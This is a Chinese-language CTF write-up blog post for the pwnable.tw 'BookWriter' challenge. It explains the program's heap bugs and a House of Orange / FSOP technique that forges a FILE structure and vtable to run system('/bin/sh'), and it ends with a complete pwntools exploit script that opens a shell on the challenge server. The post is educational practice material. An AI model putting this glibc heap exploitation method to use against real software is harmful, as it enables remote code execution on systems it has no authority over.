<html><head><meta http-equiv="content-type" content="text/html; charset=utf-8"/><meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" name="viewport"/><meta content="yes" name="apple-mobile-web-app-capable"/><meta content="black-translucent" name="apple-mobile-web-app-status-bar-style"/><meta content="telephone=no" name="format-detection"/><meta name="description" content="Vulnerability|Security|Binary"/><title>BookWriter Writeup[pwnable.tw] | WeaponX's Blog</title><link rel="stylesheet" type="text/css" href="/css/normalize.css"/><link rel="stylesheet" type="text/css" href="/css/highlight.css"/><link rel="stylesheet" type="text/css" href="/css/font.css"/><link rel="stylesheet" type="text/css" href="/css/noise.css"/><link rel="stylesheet" type="text/css" href="//cdn.bootcss.com/font-awesome/4.5.0/css/font-awesome.min.css"/><link rel="Shortcut Icon" type="image/x-icon" href="/favicon.ico"/><link rel="alternate" type="application/atom+xml" href="/atom.xml"/></head><body><article class="wrapper"><div class="post-main"><div class="nav"><nav class="container"><a class="sidebar-nav-item active" href="/">Home</a><a class="sidebar-nav-item" href="/archives">Archives</a></nav><div class="container post-meta"><div class="post-tags"><a class="post-tag-link" href="/tags/ctf/">ctf</a><a class="post-tag-link" href="/tags/pwn/">pwn</a><a class="post-tag-link" href="/tags/writeup/">writeup</a></div><div class="post-time">2018-06-11</div></div></div><div class="container post-header"><h1>BookWriter Writeup[pwnable.tw]</h1></div><div class="container post-content"><p>首先，我们检查一下程序开了哪些缓解措施</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><div class="line">Arch:     amd64-64-little</div><div class="line">RELRO:    Full RELRO</div><div class="line">Stack:    Canary found</div><div class="line">NX:       NX enabled</div><div class="line">PIE:      No PIE (0x400000)</div><div class="line">FORTIFY:  Enabled</div></pre></td></tr></table></figure>
<p>接着，对程序作了简单的逆向，发现了几处漏洞点：</p>
<ul>
<li>在获取<code>author</code>时，没有用<code>\x00</code>截断，因为<code>author</code>和<code>pages ptr</code>相邻，若<code>pages[0]</code>已经有数据，则会泄漏堆的指针</li>
<li>在<code>edit</code>的时候也没有使用<code>\x00</code>截断，导致可能错误的计算<code>size</code>，越界写</li>
<li>因为<code>pages</code>最多含有8个元素，而在<code>add page</code>的时候错误的判断<code>if ( i &gt; 8 )</code>导致第九个<code>page</code>的指针会覆盖掉<code>page[0]</code>的<code>size</code></li>
</ul>
<a id="more"></a>
<p>我们输入在<code>author</code>输入<code>0x40</code>长度的字符串，然后<code>add</code>添加一个<code>0x18</code>大小的<code>page[0]</code>，填充<code>18</code>字节的数据。调用<code>info</code>则会将<code>heap</code>指针打印出来。这里选择<code>0x18</code>的原因是因为分配堆的时候<code>16</code>字节对齐，最后<code>8</code>字节会占用下一块的<code>PREV_SIZE</code>。</p>
<p>然后，<code>edit</code>编译<code>pages[0]</code>，再输入<code>0x18</code>个字符，因为<code>strlen</code>错误的计算的长度，此时<code>pages[0]</code>的<code>size</code>为<code>strlen(0x18 + strlen(top_chunk_size))</code>。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><div class="line">getinput_400856((__int64)pages_6020A0[v1], page_size_6020E0[v1]);</div><div class="line">page_size_6020E0[v1] = <span class="built_in">strlen</span>(pages_6020A0[v1]);<span class="comment">// error size</span></div><div class="line"><span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">"Done !"</span>);</div></pre></td></tr></table></figure>
<p>接着，我们就可以继续<code>edit</code>来编辑<code>top chunk</code>的大小了。将<code>top chunk</code>的大小改成<code>0xfe1</code>。因为函数里调用了<code>scanf</code>，且<code>scanf</code>会分配<code>0x1000</code>大小的堆且不回收，且<code>0x1000 &gt; 0xfe1</code>。所以，在函数结束后，系统会把<code>top chunk</code>放入<code>unsorted bin</code>里。</p>
<p>我们继续使用<code>edit</code>来编辑<code>pages[0]</code>，这时，输入<code>\x00</code>来使得<code>pages[0]</code>的<code>size</code>为0，绕过<code>add</code>时候的检测，用来添加<code>pages[8]</code>，完成指针覆盖<code>pages[0]</code>的<code>size</code>。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><div class="line"><span class="keyword">for</span> ( i = <span class="number">0</span>; ; ++i )</div><div class="line">&#123;</div><div class="line">  <span class="keyword">if</span> ( i &gt; <span class="number">8</span> )</div><div class="line">    <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">"You can't add new page anymore!"</span>);</div><div class="line">  <span class="keyword">if</span> ( !pages_6020A0[i] )                     <span class="comment">// check</span></div><div class="line">    <span class="keyword">break</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>接着，我们添加<code>pages[1]-pages[8]</code>，每个都输入8个字节，这里是为了将<code>unsorted bin addr</code>也就是<code>main_arena + 0x58</code>打印出来（因为此时我们分配的内存都是从<code>unsorted bin</code>切分出来的）。我们可以通过<code>view pages[3]</code>来得到<code>main_arena + 0x58</code>的地址。此时，我们就可以得到<code>libc</code>的基址了。</p>
<p>此时，<code>pages[0]</code>的<code>size</code>已经是堆的地址了，就可以使用<code>edit</code>越界写其他数据了，也可以写<code>unsorted bin</code>的<code>FD</code>和<code>BK</code>，即可以利用<code>FSOP</code>来完成利用。</p>
<p>我们需要把<code>unsorted bin</code>用以下内容覆盖</p>
<figure class="highlight python"><table><tr><td class="code"><pre><div class="line">data  = <span class="string">'/bin/sh\x00'</span></div><div class="line">data += p64(<span class="number">0x61</span>)</div><div class="line">data += p64(unsortedbin_addr)</div><div class="line">data += p64(libc_base + libc.symbols[<span class="string">'_IO_list_all'</span>] - <span class="number">0x10</span>)</div><div class="line">data += p64(<span class="number">2</span>)</div><div class="line">data += p64(<span class="number">3</span>)</div><div class="line">data = data.ljust(<span class="number">0xc0</span>, <span class="string">'\x00'</span>)</div><div class="line">data + p64(<span class="number">0xffffffffffffffff</span>)</div><div class="line">data = data.ljust(<span class="number">0xe0</span><span class="number">-8</span>, <span class="string">'\x00'</span>)</div><div class="line"></div><div class="line">vtable = p64(<span class="number">0</span>) * <span class="number">3</span> + p64(libc_base + libc.symbols[<span class="string">'system'</span>])</div><div class="line">vtable_addr = heap_addr + <span class="number">0x310</span> + <span class="number">0xe0</span></div><div class="line"></div><div class="line">data += p64(vtable_addr)</div><div class="line">data += vtable</div></pre></td></tr></table></figure>
<p> 之后再分配一块内存就会执行<code>system(/bin/sh)</code>，我们来看下面分析。</p>
<p>首先，<code>_IO_list_all</code>的结构如下</p>
<figure class="highlight c"><table><tr><td class="code"><pre><div class="line"><span class="keyword">extern</span> <span class="keyword">struct</span> _IO_FILE_plus *_IO_list_all;</div><div class="line"></div><div class="line"><span class="keyword">struct</span> _IO_FILE_plus</div><div class="line">&#123;</div><div class="line">  FILE file;</div><div class="line">  <span class="keyword">const</span> <span class="keyword">struct</span> _IO_jump_t *vtable;</div><div class="line">&#125;;</div><div class="line"></div><div class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> _IO_FILE FILE;</div><div class="line"></div><div class="line"><span class="keyword">struct</span> _IO_FILE</div><div class="line">&#123;</div><div class="line">  <span class="keyword">int</span> _flags;                <span class="comment">/* High-order word is _IO_MAGIC; rest is flags. */</span></div><div class="line">  <span class="comment">/* The following pointers correspond to the C++ streambuf protocol. */</span></div><div class="line">  <span class="keyword">char</span> *_IO_read_ptr;        <span class="comment">/* Current read pointer */</span></div><div class="line">  <span class="keyword">char</span> *_IO_read_end;        <span class="comment">/* End of get area. */</span></div><div class="line">  <span class="keyword">char</span> *_IO_read_base;        <span class="comment">/* Start of putback+get area. */</span></div><div class="line">  <span class="keyword">char</span> *_IO_write_base;        <span class="comment">/* Start of put area. */</span></div><div class="line">  <span class="keyword">char</span> *_IO_write_ptr;        <span class="comment">/* Current put pointer. */</span></div><div class="line">  <span class="keyword">char</span> *_IO_write_end;        <span class="comment">/* End of put area. */</span></div><div class="line">  <span class="keyword">char</span> *_IO_buf_base;        <span class="comment">/* Start of reserve area. */</span></div><div class="line">  <span class="keyword">char</span> *_IO_buf_end;        <span class="comment">/* End of reserve area. */</span></div><div class="line">  <span class="comment">/* The following fields are used to support backing up and undo. */</span></div><div class="line">  <span class="keyword">char</span> *_IO_save_base; <span class="comment">/* Pointer to start of non-current get area. */</span></div><div class="line">  <span class="keyword">char</span> *_IO_backup_base;  <span class="comment">/* Pointer to first valid character of backup area */</span></div><div class="line">  <span class="keyword">char</span> *_IO_save_end; <span class="comment">/* Pointer to end of non-current get area. */</span></div><div class="line">  <span class="keyword">struct</span> _IO_marker *_markers;</div><div class="line">  <span class="keyword">struct</span> _IO_FILE *_chain;</div><div class="line">  <span class="keyword">int</span> _fileno;</div><div class="line">  <span class="keyword">int</span> _flags2;</div><div class="line">  <span class="keyword">__off_t</span> _old_offset; <span class="comment">/* This used to be _offset but it's too small.  */</span></div><div class="line">  <span class="comment">/* 1+column number of pbase(); 0 is unknown. */</span></div><div class="line">  <span class="keyword">unsigned</span> <span class="keyword">short</span> _cur_column;</div><div class="line">  <span class="keyword">signed</span> <span class="keyword">char</span> _vtable_offset;</div><div class="line">  <span class="keyword">char</span> _shortbuf[<span class="number">1</span>];</div><div class="line">  _IO_lock_t *_lock;</div><div class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> _IO_USE_OLD_IO_FILE</span></div><div class="line">&#125;;</div><div class="line"></div><div class="line"><span class="keyword">struct</span> _IO_jump_t</div><div class="line">&#123;</div><div class="line">    JUMP_FIELD(<span class="keyword">size_t</span>, __dummy);</div><div class="line">    JUMP_FIELD(<span class="keyword">size_t</span>, __dummy2);</div><div class="line">    JUMP_FIELD(_IO_finish_t, __finish);</div><div class="line">    JUMP_FIELD(_IO_overflow_t, __overflow);</div><div class="line">    JUMP_FIELD(_IO_underflow_t, __underflow);</div><div class="line">    JUMP_FIELD(_IO_underflow_t, __uflow);</div><div class="line">    JUMP_FIELD(_IO_pbackfail_t, __pbackfail);</div><div class="line">    <span class="comment">/* showmany */</span></div><div class="line">    JUMP_FIELD(_IO_xsputn_t, __xsputn);</div><div class="line">    JUMP_FIELD(_IO_xsgetn_t, __xsgetn);</div><div class="line">    JUMP_FIELD(_IO_seekoff_t, __seekoff);</div><div class="line">    JUMP_FIELD(_IO_seekpos_t, __seekpos);</div><div class="line">    JUMP_FIELD(_IO_setbuf_t, __setbuf);</div><div class="line">    JUMP_FIELD(_IO_sync_t, __sync);</div><div class="line">    JUMP_FIELD(_IO_doallocate_t, __doallocate);</div><div class="line">    JUMP_FIELD(_IO_read_t, __read);</div><div class="line">    JUMP_FIELD(_IO_write_t, __write);</div><div class="line">    JUMP_FIELD(_IO_seek_t, __seek);</div><div class="line">    JUMP_FIELD(_IO_close_t, __close);</div><div class="line">    JUMP_FIELD(_IO_stat_t, __stat);</div><div class="line">    JUMP_FIELD(_IO_showmanyc_t, __showmanyc);</div><div class="line">    JUMP_FIELD(_IO_imbue_t, __imbue);</div><div class="line">&#125;;</div></pre></td></tr></table></figure>
<p>在分配一块内存时，首先会从<code>unsorted bin</code>中拆下来一块。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><div class="line">victim = unsorted_chunks(av)-&gt;bk</div><div class="line">bck = victim-&gt;bk;</div><div class="line">unsorted_chunks(av)-&gt;bk = bck;</div><div class="line">bck-&gt;fd = unsorted_chunks(av);</div></pre></td></tr></table></figure>
<p>此时，<code>_IO_list_all</code>已经被改写成了<code>main_arena+0x58</code>。所以<code>_IO_list_all</code>已经变成了如下内容</p>
<figure class="highlight"><table><tr><td class="code"><pre><div class="line">$2 = &#123;</div><div class="line">  file = &#123;</div><div class="line">    ...</div><div class="line">    _IO_save_end = 0x0, </div><div class="line">    _markers = 0x0, </div><div class="line">    _chain = main_arena + 0x58 + 0x60,  //offset = 0x68</div><div class="line">    ...</div><div class="line">    _mode = 0, </div><div class="line">    _unused2 = '\000' &lt;repeats 19 times&gt;</div><div class="line">  &#125;, </div><div class="line">  vtable = ... &lt;_IO_file_jumps&gt;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>然而，<code>main_arena + 0x58 + 0x60</code>是<code>small_bin[4]</code>的<code>FD</code>和<code>BK</code>。又因为，分配内存时，由于<code>unsorted bin</code>的大小已经被我们改写成了<code>0x61</code>，所以会先把<code>unsorted bin</code>加入<code>small_bin[4]</code>，所以此时<code>_IO_list_all-&gt;_chain</code>指向的内容已经是我们可以控制的了。</p>
<p><code>_IO_list_all-&gt;_chain</code>还是部署一个<code>FILE</code>结构体（此时，这里已经变成<code>unsorted bin</code>）</p>
<figure class="highlight c"><table><tr><td class="code"><pre><div class="line"><span class="keyword">int</span> _IO_flush_all_lockp (<span class="keyword">int</span> do_lock)</div><div class="line">&#123;</div><div class="line">    ...</div><div class="line">    <span class="keyword">if</span> (((fp-&gt;_mode &lt;= <span class="number">0</span> &amp;&amp; fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base)</div><div class="line">#<span class="keyword">if</span> defined _LIBC || defined _GLIBCPP_USE_WCHAR_T</div><div class="line">       || (_IO_vtable_offset (fp) == <span class="number">0</span></div><div class="line">           &amp;&amp; fp-&gt;_mode &gt; <span class="number">0</span> &amp;&amp; (fp-&gt;_wide_data-&gt;_IO_write_ptr</div><div class="line">                    &gt; fp-&gt;_wide_data-&gt;_IO_write_base))</div><div class="line">#endif</div><div class="line">       )</div><div class="line">      &amp;&amp; _IO_OVERFLOW (fp, EOF) == EOF) <span class="comment">// exec system(/bin/sh)</span></div><div class="line">    result = EOF;</div><div class="line">    ...</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>所以，要执行<code>_IO_OVERFLOW(fp, EOF)</code>必须要满足两点</p>
<ul>
<li><code>fp-&gt;_mode &lt;= 0</code></li>
<li><code>fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base</code></li>
</ul>
<p>所以，需要满足<code>unsorted bin + 0xC0 &lt;= 0</code>且<code>unsorted bin + 0x28 &gt; unsorted bin + 0x20</code>，又因为<code>_IO_OVERFLOW</code>在<code>vtable + 0x18</code>处，所以要将<code>vtable + 0x18</code>改为<code>system</code>的地址。</p>
<p>因为在分配的时候，<code>unsorted bin -&gt; BK = _IO_list_all - 0x10</code>，检测到<code>victim-&gt;size=0</code>，会触发异常，<code>flush</code>所有的<code>IO</code>流。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><div class="line"><span class="keyword">if</span> (__builtin_expect (chunksize_nomask (victim) &lt;= <span class="number">2</span> * SIZE_SZ, <span class="number">0</span>)</div><div class="line">    || __builtin_expect (chunksize_nomask (victim)</div><div class="line">                         &gt; av-&gt;system_mem, <span class="number">0</span>))</div><div class="line">  malloc_printerr (<span class="string">"malloc(): memory corruption"</span>); <span class="comment">// &lt;---- HERE</span></div><div class="line">size = chunksize (victim);</div></pre></td></tr></table></figure>
<p>后面的执行链<code>malloc_printerr -&gt;  _libc_message -&gt; abort -&gt; _IO_flush_all_lockp -&gt; _IO_OVERFLOW</code>。导致执行<code>system(/bin/sh)</code>。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><div class="line"><span class="comment"># encoding:utf-8</span></div><div class="line"></div><div class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</div><div class="line"></div><div class="line">r = remote(<span class="string">'chall.pwnable.tw'</span>, <span class="number">10304</span>)</div><div class="line"><span class="comment">#r = process('./bookwriter', env = &#123;'LD_PRELOAD':'./libc_64.so.6'&#125;)</span></div><div class="line"><span class="comment">#r = process('./bookwriter')</span></div><div class="line"></div><div class="line"><span class="comment">#libc = ELF('./libc.so.6')</span></div><div class="line">libc = ELF(<span class="string">'./libc_64.so.6'</span>)</div><div class="line"></div><div class="line"><span class="comment">#context.log_level = 'DEBUG'</span></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">add_page</span><span class="params">(size, content)</span>:</span></div><div class="line">    r.recvuntil(<span class="string">'Your choice :'</span>)</div><div class="line">    r.sendline(<span class="string">'1'</span>)</div><div class="line">    r.recvuntil(<span class="string">'Size of page :'</span>)</div><div class="line">    r.sendline(str(size))</div><div class="line">    r.recvuntil(<span class="string">'Content :'</span>)</div><div class="line">    r.send(content)</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">view_page</span><span class="params">(idx)</span>:</span></div><div class="line">    r.recvuntil(<span class="string">'Your choice :'</span>)</div><div class="line">    r.sendline(<span class="string">'2'</span>)</div><div class="line">    r.recvuntil(<span class="string">'Index of page :'</span>)</div><div class="line">    r.sendline(str(idx))</div><div class="line">    r.recvuntil(<span class="string">'Content :\n'</span>)</div><div class="line">    <span class="keyword">return</span> r.recvline()</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit_page</span><span class="params">(idx, content)</span>:</span></div><div class="line">    r.recvuntil(<span class="string">'Your choice :'</span>)</div><div class="line">    r.sendline(<span class="string">'3'</span>)</div><div class="line">    r.recvuntil(<span class="string">'Index of page :'</span>)</div><div class="line">    r.sendline(str(idx))</div><div class="line">    r.recvuntil(<span class="string">'Content:'</span>)</div><div class="line">    r.sendline(content)</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">info</span><span class="params">(choice, leak = <span class="number">0</span>, au = <span class="string">''</span>)</span>:</span></div><div class="line">    r.recvuntil(<span class="string">'Your choice :'</span>)</div><div class="line">    r.sendline(<span class="string">'4'</span>)</div><div class="line">    r.recvuntil(<span class="string">'Author : '</span>)</div><div class="line">    <span class="keyword">if</span> leak == <span class="number">0</span>:</div><div class="line">        author = r.recvline()</div><div class="line">    <span class="keyword">else</span>:</div><div class="line">        author = r.recv(<span class="number">0x40</span>+<span class="number">5</span>)</div><div class="line">    r.recvuntil(<span class="string">'Do you want to change the author ? (yes:1 / no:0) '</span>)</div><div class="line">    r.sendline(str(choice))</div><div class="line">    <span class="keyword">if</span> str(choice) == <span class="string">"1"</span>:</div><div class="line">        r.recvuntil(<span class="string">'Author :'</span>)</div><div class="line">        r.sendline(au)</div><div class="line">        <span class="keyword">return</span> author</div><div class="line">    <span class="keyword">return</span> author</div><div class="line"></div><div class="line">r.recvuntil(<span class="string">'Welcome to the BookWriter !'</span>)</div><div class="line">r.sendline(<span class="string">'a'</span> * <span class="number">0x40</span>)</div><div class="line"></div><div class="line">add_page(<span class="number">0x18</span>,<span class="number">0x18</span> * <span class="string">'a'</span>)</div><div class="line"></div><div class="line">edit_page(<span class="number">0</span>, <span class="number">0x18</span>*<span class="string">'a'</span>)</div><div class="line">edit_page(<span class="number">0</span>, <span class="number">0x18</span>*<span class="string">'a'</span> + <span class="string">'\xe1\x0f\x00'</span>)</div><div class="line">edit_page(<span class="number">0</span>, <span class="string">'\x00'</span>*<span class="number">8</span>)</div><div class="line"></div><div class="line">ret = info(<span class="number">0</span>, <span class="number">1</span>)[:<span class="number">-1</span>]</div><div class="line"></div><div class="line">heap_addr = u64(ret[<span class="number">0x40</span>:<span class="number">0x44</span>].ljust(<span class="number">8</span>, <span class="string">'\x00'</span>))</div><div class="line"></div><div class="line">log.success(<span class="string">'HEAP ADDR =&gt; [%s]'</span> % hex(heap_addr))</div><div class="line"></div><div class="line"><span class="keyword">for</span> i <span class="keyword">in</span> xrange(<span class="number">0</span>, <span class="number">8</span>):</div><div class="line">    add_page(<span class="number">0x50</span>, <span class="string">'a'</span>*<span class="number">8</span>)</div><div class="line"></div><div class="line">ret = view_page(<span class="number">4</span>)</div><div class="line">unsortedbin_addr = u64(ret[<span class="number">8</span>:<span class="number">8</span>+<span class="number">6</span>].ljust(<span class="number">8</span>, <span class="string">'\x00'</span>))</div><div class="line"><span class="comment">#libc_base = unsortedbin_addr - 0x3c4b78 #local</span></div><div class="line">libc_base = unsortedbin_addr - <span class="number">0x3c3b78</span></div><div class="line">log.success(<span class="string">'UNSORTEDBIN ADDR =&gt; [%s]'</span> % hex(unsortedbin_addr))</div><div class="line">log.success(<span class="string">'LIBC ADDR =&gt; [%s]'</span> % hex(libc_base))</div><div class="line">system_addr = libc_base + libc.symbols[<span class="string">'system'</span>]</div><div class="line"></div><div class="line">vtable = p64(<span class="number">0</span>) * <span class="number">3</span> + p64(libc_base + libc.symbols[<span class="string">'system'</span>])</div><div class="line">vtable_addr = heap_addr + <span class="number">0x310</span> + <span class="number">0xe0</span></div><div class="line"></div><div class="line">data_pad = <span class="string">'\x00'</span> * <span class="number">0x310</span></div><div class="line">data  = <span class="string">'/bin/sh\x00'</span></div><div class="line">data += p64(<span class="number">0x61</span>)</div><div class="line">data += p64(unsortedbin_addr)</div><div class="line">data += p64(libc_base + libc.symbols[<span class="string">'_IO_list_all'</span>] - <span class="number">0x10</span>)</div><div class="line">data += p64(<span class="number">2</span>)</div><div class="line">data += p64(<span class="number">3</span>)</div><div class="line">data = data.ljust(<span class="number">0xc0</span>, <span class="string">'\x00'</span>)</div><div class="line">data + p64(<span class="number">0xffffffffffffffff</span>)</div><div class="line">data = data.ljust(<span class="number">0xe0</span><span class="number">-8</span>, <span class="string">'\x00'</span>)</div><div class="line">data += p64(vtable_addr)</div><div class="line">data += vtable</div><div class="line"></div><div class="line">edit_page(<span class="number">0</span>, data_pad + data)</div><div class="line"></div><div class="line">r.recvuntil(<span class="string">'Your choice :'</span>)</div><div class="line">r.sendline(<span class="string">'1'</span>)</div><div class="line">r.recvuntil(<span class="string">'Size of page :'</span>)</div><div class="line">r.sendline(<span class="string">'20'</span>)</div><div class="line"></div><div class="line">r.interactive()</div></pre></td></tr></table></figure>
<h2 id="REFER"><a href="#REFER" class="headerlink" title="REFER"></a>REFER</h2><p><a href="http://www.freebuf.com/articles/system/151407.html" target="_blank" rel="external">http://www.freebuf.com/articles/system/151407.html</a></p>
<p><a href="https://www.cnblogs.com/shangye/p/6268981.html" target="_blank" rel="external">https://www.cnblogs.com/shangye/p/6268981.html</a></p>
<p><a href="http://4ngelboy.blogspot.com/2016/10/hitcon-ctf-qual-2016-house-of-orange.html" target="_blank" rel="external">http://4ngelboy.blogspot.com/2016/10/hitcon-ctf-qual-2016-house-of-orange.html</a></p>
</div></div><div class="post-main post-comment"></div></article><link rel="stylesheet" type="text/css" href="//cdn.bootcss.com/fancybox/2.1.5/jquery.fancybox.css"/><script src="//cdn.bootcss.com/jquery/2.0.3/jquery.min.js"></script><script src="//cdn.bootcss.com/fancybox/2.1.5/jquery.fancybox.pack.js"></script><script>$(document).ready(function() {
    $(".fancybox").fancybox();
});
</script></body></html>